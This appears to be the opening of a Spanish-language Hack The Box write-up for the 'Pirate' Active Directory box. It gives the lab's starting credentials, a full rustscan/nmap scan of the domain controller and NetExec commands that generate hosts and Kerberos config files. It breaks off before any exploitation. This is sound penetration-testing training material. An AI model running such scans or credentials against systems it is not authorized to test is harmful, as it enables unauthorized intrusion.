---
noteID: c02241b1-4afa-40c4-96bf-8bc2b125aa93
---
![Pirate](https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a11e354b-d5c2-4dd6-8f93-dcab57e27920.png)

>[!Info]
>As is common in real life pentests, you will start the Pirate box with credentials for the following account **pentest** / **p3nt3st2025!&**

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  pyhtb machine start Pirate
[*] Resolving name 'Pirate'...
[*] Starting machine ID 844...
[+] Start request sent successfully!
[*] Waiting for machine to boot...
[+] Machine is online! IP: 10.129.244.95
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  rustscan -a 10.129.244.95 --no-banner --ulimit 3000 -r 1-65535 -- -A -sCV -o Ports.txt
[~] Automatically increasing ulimit value to 3000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.129.244.95:53
Open 10.129.244.95:88
Open 10.129.244.95:80
Open 10.129.244.95:135
Open 10.129.244.95:139
Open 10.129.244.95:389
Open 10.129.244.95:445
Open 10.129.244.95:464
Open 10.129.244.95:593
Open 10.129.244.95:636
Open 10.129.244.95:2179
Open 10.129.244.95:3268
Open 10.129.244.95:3269
Open 10.129.244.95:5985
Open 10.129.244.95:9389
Open 10.129.244.95:49667
Open 10.129.244.95:49690
Open 10.129.244.95:49692
Open 10.129.244.95:49689
Open 10.129.244.95:49693
Open 10.129.244.95:49918
Open 10.129.244.95:49941
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A -sCV -o Ports.txt" on ip 10.129.244.95
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2026-11-24 18:38 CET
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:38
Completed NSE at 18:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:38
Completed NSE at 18:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:38
Completed NSE at 18:38, 0.00s elapsed
Initiating Ping Scan at 18:38
Scanning 10.129.244.95 [4 ports]
Completed Ping Scan at 18:38, 0.46s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:38
Completed Parallel DNS resolution of 1 host. at 18:38, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 18:38
Scanning 10.129.244.95 [22 ports]
Discovered open port 445/tcp on 10.129.244.95
Discovered open port 139/tcp on 10.129.244.95
Discovered open port 593/tcp on 10.129.244.95
Discovered open port 53/tcp on 10.129.244.95
Discovered open port 135/tcp on 10.129.244.95
Discovered open port 5985/tcp on 10.129.244.95
Discovered open port 49692/tcp on 10.129.244.95
Discovered open port 389/tcp on 10.129.244.95
Discovered open port 49693/tcp on 10.129.244.95
Discovered open port 80/tcp on 10.129.244.95
Discovered open port 3268/tcp on 10.129.244.95
Discovered open port 49941/tcp on 10.129.244.95
Discovered open port 3269/tcp on 10.129.244.95
Discovered open port 49667/tcp on 10.129.244.95
Discovered open port 49918/tcp on 10.129.244.95
Discovered open port 49690/tcp on 10.129.244.95
Discovered open port 9389/tcp on 10.129.244.95
Discovered open port 2179/tcp on 10.129.244.95
Discovered open port 636/tcp on 10.129.244.95
Discovered open port 49689/tcp on 10.129.244.95
Discovered open port 88/tcp on 10.129.244.95
Discovered open port 464/tcp on 10.129.244.95
Completed SYN Stealth Scan at 18:38, 0.90s elapsed (22 total ports)
Initiating Service scan at 18:38
Scanning 22 services on 10.129.244.95
Completed Service scan at 18:39, 60.96s elapsed (22 services on 1 host)
Initiating OS detection (try #1) against 10.129.244.95
Retrying OS detection (try #2) against 10.129.244.95
Initiating Traceroute at 18:39
Completed Traceroute at 18:39, 0.43s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 18:39
Completed Parallel DNS resolution of 2 hosts. at 18:39, 0.22s elapsed
DNS resolution of 2 IPs took 0.22s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.129.244.95.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:39
NSE Timing: About 99.97% done; ETC: 18:40 (0:00:00 remaining)
Completed NSE at 18:40, 40.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:40
Completed NSE at 18:40, 6.16s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:40
Completed NSE at 18:40, 0.00s elapsed
Nmap scan report for 10.129.244.95
Host is up, received echo-reply ttl 127 (0.38s latency).
Scanned at 2026-11-24 18:38:36 CET for 116s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-11-25 00:38:44Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-11-25T00:25:36
| Not valid after:  2027-11-25T00:25:36
| MD5:   b4a37dd3e33ce3127559a4935b1abe03
| SHA-1: 69f81c2d2bab964dac5bdd0ebc86b89bae2e7e71
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAVQc0LU0SNRegAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
| MRcwFQYDVQQDEw5waXJhdGUtREMwMS1DQTAeFw0yNjExMjUwMDI1MzZaFw0yNzEx
| MjUwMDI1MzZaMBoxGDAWBgNVBAMTD0RDMDEucGlyYXRlLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAKEDGiy3aWTerhAvCJCwN3E3OJb86jfpe4MU
| 7qO6HxDMXbQtQGbjtp3uD+4s597M5SywTwrKiHCEPhXkta5DPPWCi5bBPI/gGtq8
| HI+BwSHg3XkhetPc+a9jPVnoSyG1mjuEgIcoku82jSIfzJx1dKnp6a9Tu3va2NC2
| YlMeV0HMoUFgEwz6ViNKRSOcuXIkCglWK95J0dnqmh7OTJM7OeN4m8dTHk/GWFrh
| MiQj91+5mniUsGiTiwosmZA9vDE1A+hzFUsYiUU0y5ysReFkyzVIaJ8j4FGMqrHN
| 4tYfSJA3AHECjfKPAHDllKAuqDks29eh8wgLNdj39BPS69Fa6CUCAwEAAaOCAzkw
| ggM1MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFOIt+KSx201m
| AnP8rywauGtTFSNUMB8GA1UdIwQYMBaAFLtY4D2HzTfY9jUtfvRgBNVPOZsIMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXBpcmF0ZS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049cGlyYXRlLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDEVbnRlVqPSpJn
| m1iCmy/sgg9EQzAxLnBpcmF0ZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQxMDc0MjQxMjgtNDE1ODA4MzU3My0xMzAwMzI1
| MjQ4LTEwMDAwDQYJKoZIhvcNAQELBQADggEBAMVVs9T47SlET3g8S0U6KsJlntIC
| I/wCUbsYEr44nEPyrZ/rMgfU1xf0yAo1YQQpYUuXrS6RsrGPA1aw4Hk2oKhberHw
| lteYPway6XjZ6wkKcazNDYjl0zBhV6KA6z6WgMeUwuq35I97iNeEUbT+QGFbJQAs
| LTFctaK3RfBUHwY1q+5UDQu/yLAmqCDZPzrVI3PwXjlOepnAwsbT9Xeg2CC8FFe0
| UxE7TMXAc0IkLH2X1BVA7j01AHdU9IgaF8yLRTdnbyA9Q40y53TeBB8w9fGSS1/f
| n2OvuSMwVzSlNS93wuEK+AXmIgps+jODK5btGBq/7nGRZHvCJuvm1YhiDX4=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-11-25T00:40:28+00:00; +6h59m59s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-11-25T00:40:28+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-11-25T00:25:36
| Not valid after:  2027-11-25T00:25:36
| MD5:   b4a37dd3e33ce3127559a4935b1abe03
| SHA-1: 69f81c2d2bab964dac5bdd0ebc86b89bae2e7e71
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAVQc0LU0SNRegAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
| MRcwFQYDVQQDEw5waXJhdGUtREMwMS1DQTAeFw0yNjExMjUwMDI1MzZaFw0yNzEx
| MjUwMDI1MzZaMBoxGDAWBgNVBAMTD0RDMDEucGlyYXRlLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAKEDGiy3aWTerhAvCJCwN3E3OJb86jfpe4MU
| 7qO6HxDMXbQtQGbjtp3uD+4s597M5SywTwrKiHCEPhXkta5DPPWCi5bBPI/gGtq8
| HI+BwSHg3XkhetPc+a9jPVnoSyG1mjuEgIcoku82jSIfzJx1dKnp6a9Tu3va2NC2
| YlMeV0HMoUFgEwz6ViNKRSOcuXIkCglWK95J0dnqmh7OTJM7OeN4m8dTHk/GWFrh
| MiQj91+5mniUsGiTiwosmZA9vDE1A+hzFUsYiUU0y5ysReFkyzVIaJ8j4FGMqrHN
| 4tYfSJA3AHECjfKPAHDllKAuqDks29eh8wgLNdj39BPS69Fa6CUCAwEAAaOCAzkw
| ggM1MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFOIt+KSx201m
| AnP8rywauGtTFSNUMB8GA1UdIwQYMBaAFLtY4D2HzTfY9jUtfvRgBNVPOZsIMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXBpcmF0ZS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049cGlyYXRlLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDEVbnRlVqPSpJn
| m1iCmy/sgg9EQzAxLnBpcmF0ZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQxMDc0MjQxMjgtNDE1ODA4MzU3My0xMzAwMzI1
| MjQ4LTEwMDAwDQYJKoZIhvcNAQELBQADggEBAMVVs9T47SlET3g8S0U6KsJlntIC
| I/wCUbsYEr44nEPyrZ/rMgfU1xf0yAo1YQQpYUuXrS6RsrGPA1aw4Hk2oKhberHw
| lteYPway6XjZ6wkKcazNDYjl0zBhV6KA6z6WgMeUwuq35I97iNeEUbT+QGFbJQAs
| LTFctaK3RfBUHwY1q+5UDQu/yLAmqCDZPzrVI3PwXjlOepnAwsbT9Xeg2CC8FFe0
| UxE7TMXAc0IkLH2X1BVA7j01AHdU9IgaF8yLRTdnbyA9Q40y53TeBB8w9fGSS1/f
| n2OvuSMwVzSlNS93wuEK+AXmIgps+jODK5btGBq/7nGRZHvCJuvm1YhiDX4=
|_-----END CERTIFICATE-----
2179/tcp  open  vmrdp?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-11-25T00:40:28+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-11-25T00:25:36
| Not valid after:  2027-11-25T00:25:36
| MD5:   b4a37dd3e33ce3127559a4935b1abe03
| SHA-1: 69f81c2d2bab964dac5bdd0ebc86b89bae2e7e71
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAVQc0LU0SNRegAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
| MRcwFQYDVQQDEw5waXJhdGUtREMwMS1DQTAeFw0yNjExMjUwMDI1MzZaFw0yNzEx
| MjUwMDI1MzZaMBoxGDAWBgNVBAMTD0RDMDEucGlyYXRlLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAKEDGiy3aWTerhAvCJCwN3E3OJb86jfpe4MU
| 7qO6HxDMXbQtQGbjtp3uD+4s597M5SywTwrKiHCEPhXkta5DPPWCi5bBPI/gGtq8
| HI+BwSHg3XkhetPc+a9jPVnoSyG1mjuEgIcoku82jSIfzJx1dKnp6a9Tu3va2NC2
| YlMeV0HMoUFgEwz6ViNKRSOcuXIkCglWK95J0dnqmh7OTJM7OeN4m8dTHk/GWFrh
| MiQj91+5mniUsGiTiwosmZA9vDE1A+hzFUsYiUU0y5ysReFkyzVIaJ8j4FGMqrHN
| 4tYfSJA3AHECjfKPAHDllKAuqDks29eh8wgLNdj39BPS69Fa6CUCAwEAAaOCAzkw
| ggM1MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFOIt+KSx201m
| AnP8rywauGtTFSNUMB8GA1UdIwQYMBaAFLtY4D2HzTfY9jUtfvRgBNVPOZsIMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXBpcmF0ZS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049cGlyYXRlLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDEVbnRlVqPSpJn
| m1iCmy/sgg9EQzAxLnBpcmF0ZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQxMDc0MjQxMjgtNDE1ODA4MzU3My0xMzAwMzI1
| MjQ4LTEwMDAwDQYJKoZIhvcNAQELBQADggEBAMVVs9T47SlET3g8S0U6KsJlntIC
| I/wCUbsYEr44nEPyrZ/rMgfU1xf0yAo1YQQpYUuXrS6RsrGPA1aw4Hk2oKhberHw
| lteYPway6XjZ6wkKcazNDYjl0zBhV6KA6z6WgMeUwuq35I97iNeEUbT+QGFbJQAs
| LTFctaK3RfBUHwY1q+5UDQu/yLAmqCDZPzrVI3PwXjlOepnAwsbT9Xeg2CC8FFe0
| UxE7TMXAc0IkLH2X1BVA7j01AHdU9IgaF8yLRTdnbyA9Q40y53TeBB8w9fGSS1/f
| n2OvuSMwVzSlNS93wuEK+AXmIgps+jODK5btGBq/7nGRZHvCJuvm1YhiDX4=
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-11-25T00:40:28+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-11-25T00:25:36
| Not valid after:  2027-11-25T00:25:36
| MD5:   b4a37dd3e33ce3127559a4935b1abe03
| SHA-1: 69f81c2d2bab964dac5bdd0ebc86b89bae2e7e71
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAVQc0LU0SNRegAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
| MRcwFQYDVQQDEw5waXJhdGUtREMwMS1DQTAeFw0yNjExMjUwMDI1MzZaFw0yNzEx
| MjUwMDI1MzZaMBoxGDAWBgNVBAMTD0RDMDEucGlyYXRlLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAKEDGiy3aWTerhAvCJCwN3E3OJb86jfpe4MU
| 7qO6HxDMXbQtQGbjtp3uD+4s597M5SywTwrKiHCEPhXkta5DPPWCi5bBPI/gGtq8
| HI+BwSHg3XkhetPc+a9jPVnoSyG1mjuEgIcoku82jSIfzJx1dKnp6a9Tu3va2NC2
| YlMeV0HMoUFgEwz6ViNKRSOcuXIkCglWK95J0dnqmh7OTJM7OeN4m8dTHk/GWFrh
| MiQj91+5mniUsGiTiwosmZA9vDE1A+hzFUsYiUU0y5ysReFkyzVIaJ8j4FGMqrHN
| 4tYfSJA3AHECjfKPAHDllKAuqDks29eh8wgLNdj39BPS69Fa6CUCAwEAAaOCAzkw
| ggM1MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFOIt+KSx201m
| AnP8rywauGtTFSNUMB8GA1UdIwQYMBaAFLtY4D2HzTfY9jUtfvRgBNVPOZsIMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXBpcmF0ZS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049cGlyYXRlLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDEVbnRlVqPSpJn
| m1iCmy/sgg9EQzAxLnBpcmF0ZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQxMDc0MjQxMjgtNDE1ODA4MzU3My0xMzAwMzI1
| MjQ4LTEwMDAwDQYJKoZIhvcNAQELBQADggEBAMVVs9T47SlET3g8S0U6KsJlntIC
| I/wCUbsYEr44nEPyrZ/rMgfU1xf0yAo1YQQpYUuXrS6RsrGPA1aw4Hk2oKhberHw
| lteYPway6XjZ6wkKcazNDYjl0zBhV6KA6z6WgMeUwuq35I97iNeEUbT+QGFbJQAs
| LTFctaK3RfBUHwY1q+5UDQu/yLAmqCDZPzrVI3PwXjlOepnAwsbT9Xeg2CC8FFe0
| UxE7TMXAc0IkLH2X1BVA7j01AHdU9IgaF8yLRTdnbyA9Q40y53TeBB8w9fGSS1/f
| n2OvuSMwVzSlNS93wuEK+AXmIgps+jODK5btGBq/7nGRZHvCJuvm1YhiDX4=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49918/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49941/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=11/24%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6B05CC10%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-11-25T00:39:51
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 24365/tcp): CLEAN (Timeout)
|   Check 2 (port 65389/tcp): CLEAN (Timeout)
|   Check 3 (port 47569/udp): CLEAN (Timeout)
|   Check 4 (port 53723/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   427.48 ms 10.10.14.1
2   425.73 ms 10.129.244.95

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:40
Completed NSE at 18:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:40
Completed NSE at 18:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:40
Completed NSE at 18:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.12 seconds
           Raw packets sent: 110 (8.524KB) | Rcvd: 53 (2.908KB)
```

Generamos los archivos de configuración necesarios y los configuramos.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc smb 10.129.244.95 --generate-hosts-file hosts.txt
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc smb 10.129.244.95 --generate-krb5-file krb5.conf
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] krb5 conf saved to: krb5.conf
SMB         10.129.244.95   445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf

